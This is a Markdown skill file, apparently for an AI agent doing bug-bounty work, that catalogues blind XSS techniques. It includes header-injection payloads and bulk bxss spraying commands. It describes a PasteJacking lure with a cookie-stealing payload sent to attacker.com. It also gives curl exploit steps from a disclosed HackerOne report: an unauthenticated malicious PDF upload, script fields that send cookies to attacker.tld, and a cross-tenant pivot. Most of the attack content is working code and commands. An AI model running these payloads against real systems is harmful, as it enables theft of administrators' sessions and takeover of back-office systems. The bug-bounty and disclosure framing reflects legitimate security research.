---
name: blind-xss-testing
description: Blind XSS (BXSS) hunting — injecting payloads into inputs that render asynchronously somewhere you can't see (logs, admin panels, email templates, support tickets, file/EXIF metadata) and catching execution via an out-of-band callback server. Covers OOB server setup (XSS-Hunter-Express, xss.report), header-based injection via Burp Match & Replace, bulk injection with subfinder/gau/bxss, hidden-parameter discovery with Arjun, EXIF-metadata payload embedding, polyglot/multi-encoding payload files, and PasteJacking (clipboard text/html injection into rich-text paste handlers). Use this during Phase 3 (Vulnerability Testing — Client-side) of bughunting-workflow on any contact form, feedback page, support ticket system, file upload endpoint, rich-text/comment field with paste support, or any input whose rendering destination isn't directly visible to the tester (admin panel, internal log viewer, automated email). Also trigger on mentions of blind XSS, BXSS, XSS-Hunter, xss.report, out-of-band XSS, EXIF payload injection, PasteJacking, or clipboard XSS.
---

# Blind XSS (BXSS) Testing

Technique library for XSS that doesn't reflect back to you — the payload fires later, somewhere else, usually in front of an administrator or an internal tool. Add new entries here as new injection vectors or OOB-tooling variants get validated from future writeups.

## Core theory

Ordinary XSS testing assumes you can see the result immediately (reflected in the response, or stored and visible on your own profile page). Blind XSS breaks that assumption: the sink is somewhere you have no visibility into — a backend log viewer, an admin "view submission" panel, an automated email digest, an internal support-ticket UI, a file-metadata inspector. Root cause is the same insufficient-sanitization pattern as any XSS, just located in a place that isn't part of the normal user-facing app.

Because you can't watch for execution directly, the whole methodology hinges on **out-of-band (OOB) callback capture**: every payload calls home to an attacker-controlled URL when it executes, and you watch that server's dashboard instead of the target's response. This also means blind XSS testing is inherently a *spray* strategy — inject into every plausible field/header across as much of the target's surface as possible, then check the OOB dashboard later, rather than testing one field at a time and expecting an immediate answer.

## Recorded technique: full BXSS methodology
Source: [Unmasking Blind XSS: A Hacker's Guide to High-Paying Bounties](https://infosecwriteups.com/unmasking-blind-xss-a-hackers-guide-to-high-paying-bounties-fc9e6ced5b0b)

### Phase 1 — Target discovery
Focus on submission vectors that get reviewed by someone else later, not rendered back to you: contact forms, feedback pages, support-ticket systems, file-upload endpoints. Google dorking for these forms at scale (the article references a "Lostsec Dorking" tool built specifically for locating this class of form programmatically) — same idea as any recon dorking, just filtered to input-taking, backend-reviewed surfaces.

### Phase 2 — OOB infrastructure setup
- **Self-hosted:** XSS-Hunter-Express (open-source callback server you control).
- **Public/hosted:** xss.report or similar hosted callback services — faster to start, less setup.
- Both capture the callback along with cookies, DOM content, and the victim's IP when the payload fires.
- **Payload spraying tooling:** the "Blind XSS Manager" browser extension, configured with your OOB endpoint, injects your chosen payload into every input field on a form with one click — turns manual per-field testing into a single action per page.

### Phase 3A — Header-based injection via Burp Match & Replace
Configure Burp Proxy → Settings → Match and Replace to auto-inject payloads into every outgoing request's headers, so every page you browse during a testing session sprays payloads into whatever logs those headers:
```http
GET /some/path HTTP/1.1
Host: target.example.com
User-Agent: <script src="https://YOUR-COLLAB.DOMAIN"></script>
Referer: https://YOUR-COLLAB.DOMAIN/?r=ref
X-Forwarded-For: 127.0.0.1, https://YOUR-COLLAB.DOMAIN/
X-Api-Version: <svg onload="new Image().src='https://YOUR-COLLAB.DOMAIN/?c='+document.cookie"></svg>
Cookie: session=abc; extra=<img src=x onerror="new Image().src='https://YOUR-COLLAB.DOMAIN/?c='+document.cookie">
```
Target headers worth injecting into: `User-Agent`, `Referer`, `Origin`, `Cookie`, `Accept`, `Host`, `X-Forwarded-For`. Rationale: many backends log visitor info including the `User-Agent` string verbatim; if an admin views those logs through an internal (often under-hardened) panel, the payload executes in their session.

### Phase 3B — User-Agent Switcher (manual alternative)
Configure a User-Agent-switcher browser extension to send the payload as your UA string for the whole session — "effectively spraying it across every site you visit during a testing session," useful when Burp isn't in the loop for some requests (native apps, out-of-scope-proxy traffic that still touches the same backend logging pipeline).

### Phase 3C — Hidden-parameter discovery with Arjun
Find parameters that aren't visible in the UI but are still processed/logged server-side, then inject into those too:
```bash
arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 \
  --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"

arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

### Phase 3D — Bulk injection across a whole target with `bxss`
Chain subdomain enum + URL collection + automated BXSS injection into one pipeline (complements the general recon chain in `recon-scanning-toolkit`):
```bash
# Inject into every URL parameter found across the target
subfinder -d vulnweb.com | gau | grep "&" | bxss -appendMode \
  -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters

# Inject the payload into the X-Forwarded-For header across every URL
subfinder -d vulnweb.com | gau | bxss \
  -payload '"><script src=https://xss.report/c/coffinxp></script>' -header "X-Forwarded-For"
```

### Phase 3E — Image EXIF metadata injection
1. Take any JPEG.
2. Embed a payload into a metadata field (Title, Subject, Comments):
   ```bash
   exiftool -Comment='"><img src=x onerror=alert(1)>' test.jpg
   ```
   (No ExifTool available: on Windows, right-click the file → Properties → Details tab, edit fields directly.)
3. Upload the image to the target application.
4. Payload fires when an admin/backend viewer inspects the image's properties/metadata through a panel that renders EXIF fields without sanitization.
This targets a completely different rendering surface than form-field injection — backend image-management tools frequently display metadata raw, assuming it's "just data" rather than user-controlled markup.

### Phase 3F — Polyglot & multi-encoding payload arsenal
Maintain a single HTML file containing dozens of blind-XSS payload variants, each encoded differently (double URL encoding, triple URL encoding, HTML entities, mixed case) to route around whatever input filter a given field applies. Upload this file wherever an HTML/document file-upload field accepts it, or paste individual encoded variants into text fields that filter the plain-text form of the payload but not an encoded one.

### Phase 3G — PasteJacking: clipboard HTML injection into paste handlers
Source: [Blind XSS via Clipboard Paste Handling — A Detailed Guide](https://infosecwriteups.com/blind-xss-via-clipboard-paste-handling-a-detailed-guide-4c52d65c43f4)

**Where:** rich-text inputs that accept formatted pasted content — comment systems with formatting toolbars, chat/messaging with rich text, support-ticket/CRM tools, CMS admin panels. Any element with a custom `paste` handler is a candidate.

**Root cause:** the paste handler reads the clipboard's `text/html` representation and writes it straight into the DOM via `innerHTML` without sanitizing it first:
```javascript
element.addEventListener('paste', e => {
  const html = e.clipboardData.getData('text/html') || e.clipboardData.getData('text/plain');
  e.preventDefault();
  element.innerHTML = html; // vulnerable — no sanitization before DOM insertion
});
```

**Exploit steps:**
1. Host an attacker-controlled page with a "Copy" button (or an auto-copy-on-click element) that programmatically writes **two clipboard formats at once**: a `text/plain` value that looks innocuous (e.g. `"SALE2025"`, a coupon code, anything the victim would willingly copy) and a `text/html` value containing the actual XSS payload — the victim only ever sees the plain-text bait.
2. Lure the victim into copying from that page (a "copy this discount code" pretext, a "copy this ticket ID" pretext, etc.), then pasting into the target app's rich-text field with Ctrl+V. Most paste handlers prefer `text/html` over `text/plain` when both are present, so the hidden payload — not the visible bait text — is what actually gets inserted.
3. Payload executes immediately if the field renders live, or blindly later if the pasted content is stored and rendered elsewhere (comment thread, support ticket viewed by an agent/admin) — combine with the OOB-capture approach from Phase 2 above when targeting the blind/stored case.

**Payload variants:**
```javascript
// Basic proof of execution
const htmlPayload = `<img src=x onerror="alert('XSS via paste')">`;
// Cookie exfiltration
const htmlPayload = `<img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">`;
// External OOB script injection (for the blind/stored case)
const htmlPayload = `'\"><script src=https://xss.report/c/coffinxp></script>`;
```

**Generalize:** this is a distinct injection *vector* (clipboard `text/html`, delivered via social-engineered copy-paste) layered on top of the same stored/blind-execution pattern as the rest of this skill — worth testing on any rich-text field even when direct `<script>`-in-textarea injection is already blocked, since paste-handler sanitization is frequently implemented separately from (and more weakly than) the main input-sanitization path.

### Phase 3H — Stacked defense-in-depth bypass: unauthenticated multi-field injection into an internal ticket queue
Source: [HackerOne report #3729501](https://hackerone.com/reports/3729501) — disclosed report against Essity, CVSS 9.4 Critical, "Pre-authentication Stored XSS in Essity Customer-Service Pipeline via ContactApi (reCAPTCHA bypass + no rate limit)", bounty hidden

**Where:** any unauthenticated customer-contact/support-ticket submission API whose fields later render in an internal CMS/back-office queue for a human operator to review — the classic blind-XSS "support ticket system" target this skill already flags, but this report is the concrete playbook for what to check *around* the injection itself.

**Root cause — check every layer independently, don't stop once one control looks present:** the report's core methodology is a "stacked vulnerabilities" audit — a real target frequently has *multiple* independent controls that are each individually broken, and the practical exploitability comes from all of them failing together, not from any single bug:
| Control | What to check | What failed here |
|---|---|---|
| Anti-bot token (reCAPTCHA/hCaptcha) | Is the token actually verified server-side, or only checked client-side before the request fires? | Server accepted an **empty** `ReCaptcha=` parameter — validation was client-JS-only, trivially skipped by calling the API directly with `curl` |
| CSRF protection | Does the endpoint require a valid anti-CSRF token / any cookie at all? | None present; endpoint accepted requests with **zero cookies** |
| Origin/CORS | Is `Access-Control-Allow-Origin` restricted, and is Origin/Referer validated server-side? | `Access-Control-Allow-Origin: *` — enables drive-by cross-origin submission from any attacker page, victim's browser as the unwitting requester |
| Input sanitization | Do free-text fields accept raw HTML/JS? | 12+ fields (`FirstName`, `Message`, `Phone`, `Question`, etc.) all accepted `<script>`, `<img onerror>`, `<svg onload>`, `javascript:` URIs unescaped |
| Field-specific validation | Does a format-constrained field (email, postal code) actually enforce its format? | Email accepted `"<script>alert(1)</script>"@a.com` — the quote-wrapped local-part smuggled a full script tag past whatever regex was supposedly checking it |
| Rate limiting | Any request-count/time throttle? | None — 8 tickets submitted in ~1.5s, all `{"success":true}` |
| Tenant/site authorization | Is the tenant ID (`SiteId`) validated against the authenticated caller's actual tenant? | Not enforced — any tenant ID accepted, enabling cross-brand ticket injection (see below) |
| Attachment authorization | Is the upload endpoint itself gated, and are uploaded files re-validated before being referenceable? | Unauthenticated uploads immediately referenceable by filename in a subsequent ticket submission, with only extension-based (not magic-byte) validation for non-image types |

**Exploit steps:**
1. **Stage a malicious attachment first, unauthenticated** — no auth/cookie/captcha needed to reach the upload endpoint:
   ```bash
   printf '%PDF-1.3\n1 0 obj\n<< /OpenAction << /JS (app.alert("marker")) >> >>\nendobj\ntrailer << /Root 1 0 R >>\n%%EOF\n' > poc.pdf
   curl -sk -F 'file=@poc.pdf;type=application/pdf' 'https://target/Umbraco/Api/ContactApi/SaveAttachment'
   # → ["<generated-filename>_poc.pdf"]  (server hands back a referenceable filename)
   ```
   The file-type check only inspected magic bytes for *images*; PDF/DOCX/ZIP were accepted by extension alone — see `file-upload-testing` for the broader magic-byte-bypass technique catalog this generalizes into.
2. **Submit the ticket** with the injected filename plus XSS payloads in every free-text field, empty `ReCaptcha=`, no cookies, and (the technique worth reusing on any similar engagement) **a unique per-field marker string** so a later reviewer/triager can `grep` the exact field that fired:
   ```bash
   curl -sk -X POST 'https://target/Umbraco/Api/ContactApi/SavePersonalContactExtended/' \
     -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
     --data-urlencode 'SiteId=1896' \
     --data-urlencode 'FirstName=<img src=x onerror="alert(`H1-REPORTID-FirstName`)">' \
     --data-urlencode 'Message=<script>alert(`H1-REPORTID-Message`);fetch("https://attacker.tld/?ck="+document.cookie)</script>' \
     --data-urlencode 'ReCaptcha=' \
     --data-urlencode 'AttachmentFilename[0]=<filename from step 1>' \
     [... remaining 10+ fields, each with its own H1-REPORTID-<fieldname> marker ...]
   # → {"success":true,...}
   ```
   Marking every payload with a report-specific string (`H1-3729501-FirstName`, `H1-3729501-Message`, ...) is what let the reporter tell the triager exactly what to search for in their internal queue without needing access to it themselves — reuse this pattern whenever the execution surface is something only the program's own staff can see.
3. **Confirm missing rate limiting** as its own line item — a tight loop of the same request, checking every response still succeeds:
   ```bash
   for i in {1..8}; do curl -sk -X POST '...' --data-urlencode "FirstName=ratepoc-$i" ... ; done
   # all 8 return {"success":true} inside ~1.5s
   ```
   This is a *missing* control, not a bypassed one — cross-reference `registration-flow-testing`'s missing-rate-limit entry and `rate-limit-bypass-testing` (which covers bypassing an *active* limiter, a different scenario) for the broader framing of when "no rate limit at all" itself is the reportable finding.
4. **Pivot cross-tenant via the unvalidated tenant-ID parameter** — enumerate sibling tenant IDs through any unauthenticated lookup endpoint that leaks them, then reuse the same injection against every tenant:
   ```bash
   curl -sk 'https://target/umbraco/Surface/CountryPickerSurface/CountryModal?siteId=1901' \
     | grep -oE 'href="https://www\.[a-z]+\.[a-z.]+' | sort -u
   # → discloses sibling brand domains sharing the same backend
   ```
   Then simply changing `SiteId=` on the same injection request targets a *different* brand's back-office queue — a missing-tenant-scoping IDOR, the same class `advanced-access-control-testing` covers under "cross-tenant BOLA via missing tenant scoping"; this report is the concrete instance of that pattern applied to an injection endpoint rather than a data-read endpoint.

**CVSS/severity reasoning worth reusing:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` → 9.4 Critical. The **Scope: Changed** component is the key lever here — the payload is submitted in an unauthenticated, unprivileged context, but *executes* in a privileged operator's authenticated back-office session, i.e. the vulnerable component and the impacted component are different security scopes. **User Interaction: Required** was argued as a non-mitigating factor rather than a severity reducer, since "reviewing inbound customer messages is the operator's primitive job function, guaranteeing payload execution" — use this exact argument whenever a triager tries to downgrade a blind-XSS finding for needing "user interaction" that is, in practice, unavoidable.

**Impact framing for report:** don't stop at "stored XSS" — walk the full chain the way this report did: session/anti-XSRF-token theft from the operator → creating new administrator accounts via the CMS's own management API from inside that session → installing malicious CMS packages for server-side RCE on the host serving every sibling brand → and, separately, a GDPR Article 32 angle (unverified consent-flag fields being persisted as if legitimately given). Each of those is a distinct escalation worth its own bullet in the impact section, not folded into one line.

**Generalize beyond this report:** whenever a target has *any* customer-facing submission form that funnels into an internal review queue, run this skill's existing OOB-capture methodology (Phase 1-3G above) **together with** this control-by-control stacked audit — checking reCAPTCHA/CSRF/rate-limit/tenant-scoping/upload-validation independently of the injection itself is what turns a single "found stored XSS" finding into a Critical multi-primitive report. A target that's hardened against direct `<script>` injection but still fails one of the surrounding controls (e.g. rate limiting, or tenant scoping) is still worth a report on those controls alone, chained to whatever injection primitive does land.

## Toolkit

| Tool | Purpose |
|---|---|
| Burp Suite (Match & Replace) | Auto-inject payloads into every outgoing request header during a session |
| Blind XSS Manager (browser ext.) | One-click payload injection across every field on a form |
| User-Agent Switcher (browser ext.) | Spray payload as UA string across an entire browsing session |
| Arjun | Discover hidden/undocumented parameters worth injecting into |
| ExifTool | Embed payloads into image metadata fields |
| XSS-Hunter-Express | Self-hosted OOB callback server |
| xss.report | Hosted OOB callback service |
| `bxss` (+ subfinder/gau) | Bulk automated injection across parameters/headers for an entire target |

## Impact framing for report

OOB callback capture (cookies, DOM snapshot, victim IP) is itself the proof of execution — attach the callback dashboard entry as evidence rather than relying on a live screen-share, since the execution context (an internal admin panel) usually isn't something you can screenshot directly. Frame severity by *who* the victim is: execution in an internal admin/support panel is typically higher severity than a public-facing stored XSS, since it can lead directly to full admin-session compromise from a single unauthenticated submission form.

<!-- Add new recorded techniques below this line as new blind-XSS writeups are processed. -->
